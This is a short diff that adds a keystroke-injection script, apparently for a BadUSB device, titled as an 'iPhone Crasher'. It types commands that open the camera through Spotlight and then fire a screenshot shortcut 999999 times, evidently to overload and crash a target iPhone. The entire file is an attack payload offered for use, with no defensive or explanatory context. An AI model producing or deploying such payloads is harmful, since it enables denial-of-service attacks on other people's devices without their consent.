@@ -1,0 +1,11 @@
+REM best IPhone Crasher by unveroleone
+
+GUI SPACE
+GUI TAB
+STRING camera
+ENTER
+GUI h
+STRING camera
+ENTER
+GUI-SHIFT 4
+REPEAT 999999
